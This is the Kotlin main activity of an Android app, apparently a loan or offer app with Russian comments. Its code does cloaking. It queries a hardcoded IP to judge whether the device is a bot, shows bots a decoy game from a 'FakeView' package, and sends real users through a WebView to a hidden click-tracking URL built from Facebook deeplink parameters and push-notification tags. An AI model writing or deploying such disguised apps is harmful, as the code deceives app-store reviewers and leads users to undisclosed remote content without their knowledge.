package com.organizationzaim.multiapp

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.Uri
import android.os.Bundle
import android.view.View
import android.webkit.WebSettings
import bolts.AppLinks
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.onesignal.OSNotification
import com.onesignal.OneSignal
import com.organizationzaim.multiapp.FakeView.Game.GameActivity
import com.organizationzaim.multiapp.web.WebActivity
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONException
import java.util.*


class MainActivity : Activity(), OneSignal.NotificationReceivedHandler {

    private lateinit var okHttpClient: OkHttpClient
    private lateinit var preferences: SharedPreferences

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);

        OneSignal.startInit(this)
            .setNotificationReceivedHandler(this)
            .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
            .unsubscribeWhenNotificationsAreDisabled(true)
            .init()

        initOkHttpClient()

        preferences = this.getSharedPreferences("MyPreferences", Context.MODE_PRIVATE)

        val deeplink = preferences.getString("PREFS_DEEPLINK", null)
        if (deeplink == null) {
            // Если диплинка в хранилище нет, берём из фейсбук коллбека
            getDeeplinkFromFacebook()
        } else {
            // Иначе начинаем обработку диплинка
            processDeeplinkAndStart(deeplink)
        }

    }

    override fun notificationReceived(notification: OSNotification) {
        val keys = notification.payload.additionalData.keys()
        while (keys.hasNext()) {
            val key = keys.next()
            try {
                OneSignal.sendTag(key, notification.payload.additionalData.get(key).toString())
            } catch (e: JSONException) {
                e.printStackTrace()
            }
        }
    }

    private fun initOkHttpClient() {
        okHttpClient = OkHttpClient.Builder()
            .followSslRedirects(false)
            .followRedirects(false)
            .addNetworkInterceptor {
                it.proceed(
                    it.request().newBuilder()
                        .header("User-Agent", WebSettings.getDefaultUserAgent(this))
                        .build()
                )
            }.build()

    }

    private fun isBot(): Boolean {
        try {
            val response = okHttpClient
                .newCall(Request.Builder().url("http://78.47.187.129/Z4ZvXH31").build())
                .execute()
            val redirectLocation = response.header("Location")

            redirectLocation?.let { return Uri.parse(it).host == "bot" } ?: return true
        } catch (ex: Exception) {
            return true
        }
    }

    private fun getDeeplinkFromFacebook() {
        FacebookSdk.setAutoInitEnabled(true)
        FacebookSdk.fullyInitialize()
        AppLinkData.fetchDeferredAppLinkData(applicationContext) { appLinkData ->
            val uri: Uri? = appLinkData?.targetUri ?: AppLinks.getTargetUrlFromInboundIntent(this, intent)

            // В переменную uri записывается отложенный диплинк appLinkData.targetUri
            // Если он равен null, то диплинк берется из интента (getTargetUrlFromInboundIntent)

            if (uri != null && uri.query != null) {
                processDeeplinkAndStart(uri.query!!) // передаем параметры диплинка дальше и обрабатываем
                preferences.edit().putString("PREFS_DEEPLINK", uri.query!!).apply()
            } else {
                processDeeplinkAndStart("") // передаем пустую строку в метод обработки диплинка
            }

        }
    }

    private fun processDeeplinkAndStart(deeplink: String) {

        val trackingUrl = "https://wokeup.site/click.php?key=ZvjJ12Wr2oTlGNLQyhV9"

        val clickId = getClickId()
        val sourceId = BuildConfig.APPLICATION_ID
        var finalUrl = "$trackingUrl&source=$sourceId&click_id=$clickId"

        if (!deeplink.isBlank()) {
            finalUrl = "$finalUrl&$deeplink"
        }

        GlobalScope.launch(Dispatchers.Main) {
            val isBot = withContext(Dispatchers.IO) { isBot() }

            if (isBot) {
                startActivity(Intent(this@MainActivity, GameActivity::class.java))
                finish()
            } else {

                OneSignal.sendTag("nobot", "1")
                OneSignal.sendTag("bundle", BuildConfig.APPLICATION_ID)

                val streamId = Uri.parse("?$deeplink").getQueryParameter("stream")

                if (!streamId.isNullOrBlank()) {
                    OneSignal.sendTag("stream", streamId)
                }

                val intent = Intent(this@MainActivity, WebActivity::class.java)
                intent.putExtra("URL", finalUrl)
                startActivity(intent)
            }
        }
    }

    private fun getClickId(): String {
        // Пробуем получить click_id из хранилища
        // Если его там нет, получим null
        var clickId = preferences.getString("PREFS_CLICK_ID", null)
        if (clickId == null) {
            // в случае если в хранилище нет click_id, генерируем новый
            clickId = UUID.randomUUID().toString()
            preferences.edit().putString("PREFS_CLICK_ID", clickId)
                .apply() // и сохраняем в хранилище
        }
        return clickId
    }
}
